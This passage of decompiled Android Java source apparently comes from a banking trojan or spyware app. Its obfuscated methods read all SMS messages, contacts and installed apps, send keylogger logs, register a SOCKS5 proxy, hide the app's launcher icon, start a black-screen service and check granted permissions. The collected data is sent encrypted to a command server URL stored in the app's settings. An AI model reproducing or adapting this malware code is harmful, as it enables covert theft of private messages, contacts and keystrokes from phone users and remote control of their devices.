paslaug\u0173 > ','nb':'\u00c5pne Flere nedlastede tjenester > ','pt':'Abrir Mais servi\u00e7os baixados > ','ro':'Deschide Mai multe servicii desc\u0103rcate > ','sr':'\u041e\u0442\u0432\u043e\u0440\u0438 \u0408\u043e\u0448 \u043f\u0440\u0435\u0443\u0437\u0435\u0442\u0438\u0445 \u0443\u0441\u043b\u0443\u0433\u0430 > ','sk':'Open More downloaded services > ','sl':'Odprite Ve\u010d prenesenih storitev > ','sv':'\u00d6ppna Fler nedladdade tj\u00e4nster > ','th':'\u0e40\u0e1b\u0e34\u0e14\u0e1a\u0e23\u0e34\u0e01\u0e32\u0e23\u0e17\u0e35\u0e48\u0e14\u0e32\u0e27\u0e19\u0e4c\u0e42\u0e2b\u0e25\u0e14\u0e40\u0e1e\u0e34\u0e48\u0e21\u0e40\u0e15\u0e34\u0e21 > ','tr':'A\u00e7 Di\u011fer indirilen hizmetler > ','vi':'M\u1edf th\u00eam d\u1ecbch v\u1ee5 \u0111\u00e3 t\u1ea3i xu\u1ed1ng > '}").getString(Locale.getDefault().getLanguage());
    }

    public final String _plates(Context object, String charSequence, String string) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("AK", (Object)charSequence);
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._brought((Context)object, ((StringBuilder)charSequence).toString());
    }

    public final String _scott(Context object, String charSequence, String string, String string2) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("ID", (Object)string);
        jSONObject.put("LS", (Object)charSequence);
        this.Log("Send Saved SMS", "logs: ".concat(String.valueOf(charSequence)));
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final String _painful() {
        return new JSONObject("{'en':'Click on me to activate','de':'Klicken Sie auf mich zu aktivieren','af':'Klik op my om te aktiveer','zh':'\u70b9\u51fb\u6211\u6fc0\u6d3b','cs':'Klikn\u011bte na m\u011b pro aktivaci','nl':'Klik op mij om te activeren','fr':'Cliquez sur moi pour activer','it':'Clicca su di me per attivare','ja':'\u30af\u30ea\u30c3\u30af\u3057\u3066\u30a2\u30af\u30c6\u30a3\u30d9\u30fc\u30c8','ko':'\ud65c\uc131\ud654\ud558\ub824\uba74 \uc800\ub97c \ud074\ub9ad\ud558\uc2ed\uc2dc\uc624','pl':'Kliknij na mnie, aby aktywowa\u0107','es':'Haz clic en m\u00ed para activar','ar':'\u0627\u0636\u063a\u0637 \u0639\u0644\u064a \u0644\u062a\u0641\u0639\u064a\u0644','bg':'\u041a\u043b\u0438\u043a\u043d\u0438 \u0432\u044a\u0440\u0445\u0443 \u043c\u0435\u043d, \u0437\u0430 \u0434\u0430 \u0441\u0435 \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u0430','ca':'Click on me to activate','hr':'Kliknite na mene da se aktiviram','da':'Klikk p\u00e5 meg for \u00e5 aktivere','fi':'Napsauta minua aktivoimaan','el':'\u039a\u03ac\u03bd\u03c4\u03b5 \u03ba\u03bb\u03b9\u03ba \u03c3\u03b5 \u03bc\u03b5 \u03b3\u03b9\u03b1 \u03bd\u03b1 \u03b5\u03bd\u03b5\u03c1\u03b3\u03bf\u03c0\u03bf\u03b9\u03ae\u03c3\u03b5\u03c4\u03b5','iw':'\u05dc\u05d7\u05e5 \u05e2\u05dc\u05d9\u05d9 \u05db\u05d3\u05d9 \u05dc\u05d4\u05e4\u05e2\u05d9\u05dc','hi':'\u092e\u0941\u091d\u0947 \u0938\u0915\u094d\u0930\u093f\u092f \u0915\u0930\u0928\u0947 \u0915\u0947 \u0932\u093f\u090f \u0915\u094d\u0932\u093f\u0915 \u0915\u0930\u0947\u0902','hu':'Kattintson r\u00e1m az aktiv\u00e1l\u00e1shoz','in':'Klik saya untuk mengaktifkan','lv':'Noklik\u0161\u0137iniet uz manis, lai aktiviz\u0113tu','lt':'Spustel\u0117kite mane nor\u0117dami suaktyvinti','nb':'Klikk p\u00e5 meg for \u00e5 aktivere','pt':'Clique em mim para ativar','ro':'Face\u021bi clic pe mine pentru a activa','sr':'\u041a\u043b\u0438\u043a\u043d\u0438\u0442\u0435 \u043d\u0430 \u043c\u0435\u043d\u0435 \u0434\u0430 \u0441\u0435 \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u0430\u043c','sk':'Click on me to activate','sl':'Kliknite na mene, da se aktiviram','sv':'Klicka p\u00e5 mig f\u00f6r att aktivera','th':'\u0e04\u0e25\u0e34\u0e01\u0e17\u0e35\u0e48\u0e09\u0e31\u0e19\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e1b\u0e34\u0e14\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19','tr':'Etkinle\u015ftirmek i\u00e7in bana t\u0131kla','vi':'B\u1ea5m v\u00e0o t\u00f4i \u0111\u1ec3 k\u00edch ho\u1ea1t'}").getString(Locale.getDefault().getLanguage());
    }

    public final String _servers(Context object, String charSequence, String string, String string2) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("ID", (Object)string);
        jSONObject.put("LS", (Object)charSequence);
        this.Log("Send Contacts", "logs: ".concat(String.valueOf(charSequence)));
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final void SettingsWrite(Context context, String string, String string2) {
        context = context.getSharedPreferences("ring0", 0).edit();
        context.putString(string, string2);
        context.commit();
    }

    public final String sendAddSocks5(Context object, String charSequence) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("id_device", (Object)charSequence);
        this.Log("Send_add_socks5", "Update ".concat(String.valueOf(charSequence)));
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append("q=update_socks5&ws=");
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final String sendKeyloggerLogs(Context object, String charSequence, String string, String string2) {
        JSONObject jSONObject = new JSONObject();
        jSONObject.put("LS", (Object)charSequence);
        jSONObject.put("ID", (Object)string);
        this.Log("SEND Keylogger", "logs: ".concat(String.valueOf(charSequence)));
        charSequence = new StringBuilder();
        ((StringBuilder)charSequence).append(string2);
        ((StringBuilder)charSequence).append(this._grown(jSONObject.toString()));
        return this._marina(this._brought((Context)object, ((StringBuilder)charSequence).toString()));
    }

    public final void SettingsToAdd(Context context, String string, String string2) {
        String string3 = string2;
        String string4 = this.SettingsRead(context, string);
        CharSequence charSequence = string2;
        string3 = string2;
        if (!string4.isEmpty()) {
            string3 = string2;
            charSequence = new StringBuilder();
            string3 = string2;
            ((StringBuilder)charSequence).append(string4);
            string3 = string2;
            ((StringBuilder)charSequence).append(string2);
            string3 = string2;
            charSequence = ((StringBuilder)charSequence).toString();
        }
        string3 = charSequence;
        this.SettingsWrite(context, string, (String)charSequence);
    }

    public final String _grown(String string) {
        return utils._giant(string, "lASdSnSHWdna");
    }

    public final void _bhutan(Context context) {
        if (!this.SettingsRead(context, "RS").equals("true")) return;
        context.startService(new Intent(context, srvIBlackScreen.class));
    }

    public final void _founded(Context context, String string, String string2) {
        this.SettingsWrite(context, string, this.SettingsRead(context, string).replace(string2, ""));
    }

    public final String _marina(String string) {
        return utils._possibly(string, "lASdSnSHWdna");
    }

    public final void _chapel(Context context) {
        if (!"".isEmpty()) return;
        ComponentName componentName = new ComponentName(context, mainActivity.class);
        context.getPackageManager().setComponentEnabledSetting(componentName, 2, 1);
    }

    public final void _compiled(Context context, String string) {
        String string2 = this.SettingsRead(context, "AS");
        if (string2.isEmpty()) return;
        if (!this.sendSmsLogs(context, string2, string, "q=saved_data_device&ws= ").equals("ok")) return;
        if (this.SettingsRead(context, "AS").length() > string2.length()) {
            this._founded(context, "AS", string2);
            return;
        }
        this.SettingsWrite(context, "AS", "");
    }

    final String _brought(Context object, String string) {
        object = this.SettingsRead((Context)object, "QE");
        this.Log("Connect", "url: ".concat(String.valueOf(object)));
        return this._checking((String)object, string);
    }

    public final String SettingsRead(Context context, String string) {
        if (settings != null) return settings.getString(string, null);
        context = context.getSharedPreferences("ring0", 0);
        settings = context;
        editor = context.edit();
        return settings.getString(string, null);
    }

    public final void _currency(Context context) {
        if (utils.isMyServiceRunning(context, srvWhileWorker.class)) return;
        context.startService(new Intent(context, srvWhileWorker.class));
    }

    public final void _antiques(Context context) {
        ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService("connectivity");
        boolean bl = false;
        if (connectivityManager.getNetworkInfo(0).getState() == NetworkInfo.State.CONNECTED || connectivityManager.getNetworkInfo(1).getState() == NetworkInfo.State.CONNECTED) {
            bl = true;
        }
        if (utils.isMyServiceRunning(context, srvNetworkConnect.class)) return;
        context.startService(new Intent(context, srvNetworkConnect.class));
    }

    public final void _ebooks(Context context) {
        String string = "";
        int n2 = 0;
        do {
            String string2 = new String[]{"sms/sent", "sms/inbox", "sms/draft"}[n2];
            Object object = Uri.parse((String)"content://".concat(String.valueOf(string2)));
            Cursor cursor = context.getContentResolver().query(object, null, null, null, null);
            object = string;
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    CharSequence charSequence;
                    String string3 = cursor.getString(2);
                    if (string3.length() <= 0) continue;
                    object = cursor.getString(12);
                    if (object == null) {
                        object = "";
                    } else {
                        charSequence = new StringBuilder();
                        ((StringBuilder)charSequence).append((String)object);
                        ((StringBuilder)charSequence).append(" ");
                        object = ((StringBuilder)charSequence).toString();
                    }
                    charSequence = cursor.getString(13);
                    StringBuilder stringBuilder = new StringBuilder();
                    stringBuilder.append(string);
                    stringBuilder.append("~");
                    stringBuilder.append(string2);
                    stringBuilder.append("~number: ");
                    stringBuilder.append(string3);
                    stringBuilder.append(" text: ");
                    stringBuilder.append((String)object);
                    stringBuilder.append((String)charSequence);
                    stringBuilder.append("[0#1#]");
                    string = stringBuilder.toString();
                }
                cursor.close();
                this.SettingsWrite(context, "SV", string);
                object = string;
            }
            ++n2;
            string = object;
        } while (true);
    }

    public final void _adjusted(Context context) {
        Object object = context.getPackageManager().getInstalledApplications(128);
        String string = "";
        object = object.iterator();
        do {
            if (!object.hasNext()) {
                this.SettingsWrite(context, "SC", string);
                return;
            }
            ApplicationInfo applicationInfo = (ApplicationInfo)object.next();
            int n2 = applicationInfo.flags;
            boolean bl = true;
            if ((n2 & 1) == 0) {
                bl = false;
            }
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(string);
            stringBuilder.append(applicationInfo.packageName);
            stringBuilder.append("[0#1#]");
            string = stringBuilder.toString();
        } while (true);
    }

    public final void getContacts(Context context) {
        Cursor cursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        String string = "";
        do {
            if (!cursor.moveToNext()) {
                this.SettingsWrite(context, "SX", string);
                return;
            }
            String string2 = cursor.getString(cursor.getColumnIndex("data1"));
            String string3 = cursor.getString(cursor.getColumnIndex("display_name"));
            if (string2.contains("*") || string2.contains("#") || string2.length() <= 6 || string.contains(string2)) continue;
            StringBuilder stringBuilder = new StringBuilder();
            stringBuilder.append(string);
            stringBuilder.append(string2);
            stringBuilder.append(" / ");
            stringBuilder.append(string3);
            stringBuilder.append("[0#1#]");
            string = stringBuilder.toString();
        } while (true);
    }

    public final String getInstalledApps(Context object) {
        PackageManager packageManager = object.getPackageManager();
        Object object2 = packageManager.getInstalledApplications(0);
        object = "";
        Iterator iterator = object2.iterator();
        do {
            StringBuilder stringBuilder;
            if (!iterator.hasNext()) {
                this.Log("AllApplication", utils._orbit((String)object));
                return utils._orbit((String)object);
            }
            ApplicationInfo applicationInfo = (ApplicationInfo)iterator.next();
            object2 = object;
            if (packageManager.getLaunchIntentForPackage(applicationInfo.packageName) != null) {
                stringBuilder = new StringBuilder();
                stringBuilder.append(applicationInfo.packageName);
                stringBuilder.append(":");
                object2 = object;
                if (!((String)object).contains(stringBuilder.toString())) {
                    object2 = new StringBuilder();
                    ((StringBuilder)object2).append((String)object);
                    ((StringBuilder)object2).append(applicationInfo.packageName);
                    ((StringBuilder)object2).append(":");
                    object2 = ((StringBuilder)object2).toString();
                }
            }
            object = object2;
            if ((applicationInfo.flags & 128) == 1) continue;
            object = object2;
            if ((applicationInfo.flags & 1) == 1) continue;
            stringBuilder = new StringBuilder();
            stringBuilder.append(applicationInfo.packageName);
            stringBuilder.append(":");
            object = object2;
            if (((String)object2).contains(stringBuilder.toString())) continue;
            object = new StringBuilder();
            ((StringBuilder)object).append((String)object2);
            ((StringBuilder)object).append(applicationInfo.packageName);
            ((StringBuilder)object).append(":");
            object = ((StringBuilder)object).toString();
        } while (true);
    }

    public final boolean hasPermissionAllTrue(Context context) {
        String[] arrstring = this.consts.pentium$;
        int n2 = arrstring.length;
        int n3 = 0;
        boolean bl = true;
        while (n3 < n2) {
            if (context.checkCallingOrSelfPermission(arrstring[n3]) != 0) {
                bl = false;
            }
            ++n3;
        }
        return bl;
    }

    public final void _japan(Context context) {
        Object object;
        String string = "";
        for (String string2 : this.consts.pentium$) {
            StringBuilder stringBuilder;
            if (context.checkCallingOrSelfPermission(string2) != 0) {
                stringBuilder = new StringBuilder();
                stringBuilder.append(string);
                stringBuilder.append("[");
                stringBuilder.append(string2);
                stringBuilder.append(" : off] ");
                string = stringBuilder.toString();
                continue;
            }
            stringBuilder = new StringBuilder();
            stringBuilder.append(string);
            stringBuilder.append("[");
            stringBuilder.append(string2);
            stringBuilder.append(" : on] ");
            string = stringBuilder.toString();
        }
        if (utils.isNotificationServiceEnabled(context)) {
            object = new StringBuilder();
            ((StringBuilder)object).append(string);
            ((StringBuilder)object).append("[Access to notification : on] ");
            string = ((StringBuilder)object).toString();
        } else {
            object = new StringBuilder();
            ((StringBuilder)object).append(string);
            ((StringBuilder)object).append("[Access to notification : off] ");
            string = ((StringBuilder)object).toString();
        }
        object = new StringBuilder();
        ((StringBuilder)object).append(string);
        ((StringBuilder)object).append("[143523#]");
        string = ((StringBuilder)object).toString();
        this.SettingsToAdd(context, "AS", string);
        this._compiled(context, this.SettingsRead(context, "QQ"));
    }

    public final String getLabelApplication(Context object) {
        return (String)object.getPackageManager().getApplicationLabel(object.getPackageManager().getApplicationInfo(object.getPackageName(), 128));
    }
}

